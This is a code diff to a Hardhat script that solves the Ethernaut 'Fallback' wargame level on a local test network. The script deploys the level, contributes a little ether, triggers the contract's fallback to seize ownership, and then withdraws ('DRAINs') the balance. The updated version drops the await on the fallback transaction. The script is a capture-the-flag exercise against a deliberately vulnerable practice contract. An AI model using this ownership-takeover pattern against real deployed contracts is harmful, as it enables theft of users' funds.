@@ -1,40 +1,50 @@
 const { ethers } = require('hardhat');
 
-const CTRT_ADDR = "0x3B02fF1e626Ed7a8fd6eC5299e2C54e1421B626B"
-const PLAYER_ADDR = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"
-
-
 async function main() {
-    let player = await ethers.getSigner(PLAYER_ADDR)
+    const [player] = await ethers.getSigners();
+    console.log("[0] player: ", player.address);
 
-    const contract = await ethers.getContractAt(
-        "Fallback",
-        CTRT_ADDR,
-        player
-    );
+    // deploy factory
+    console.log("\n[1] deploy FallbackFactory");
+    const Factory = await ethers.getContractFactory("FallbackFactory");
+    const factory = await Factory.connect(player).deploy();
+    await factory.deployed();
+    console.log("---- FallbackFactory address: ", factory.address);
 
+    // deploy new instance
+    console.log("\n[2] create a Fallback instance");
+    const receipt = await factory.connect(player).createInstance(player.address);
+    const instance_address = (await receipt.wait()).events[0].args[0];
+    const ctrt = await ethers.getContractAt("Fallback", instance_address, player);
+    console.log("---- Fallback address: ", ctrt.address);
 
-    console.log("--[1] contribute");
-    await contract.contribute({
+    // attack: (1) contribute
+    console.log("\n[3] attack: contribute")
+    await ctrt.connect(player).contribute({
         value: ethers.utils.parseEther("0.0001"),
         gasLimit: 50000
     });
+    console.log("---- check contribution: ", ((await ctrt.getContribution()).toString()))
 
-    console.log("Current contribution", ((await contract.getContribution()).toString()))
-
-    console.log("--[2] send malicious TX");
+    console.log("\n[4] call fallback");
     const tx = {
-        to: CTRT_ADDR,
+        to: ctrt.address,
         value: ethers.utils.parseEther("0.0001"),
+        gasLimit: 50000,
     };
+    player.sendTransaction(tx);
 
-    await player.sendTransaction(tx);
+    console.log("\n[5] DRAIN all money");
+    await ctrt.withdraw();
 
-    console.log("--[3] withdraw all the money");
-    const owner = await contract.owner();
 
-    if (owner == player.address) {
-        await contract.withdraw();
+    // check
+    let res = await factory.validateInstance(ctrt.address, player.address);
+
+    if (res == true) {
+        console.log("[+] Done!");
+    } else {
+        console.log("[+] Fail...");
     }
 }
 
@@ -42,3 +52,4 @@ main().catch((error) => {
     console.error(error);
     process.exitCode = 1;
 });
+
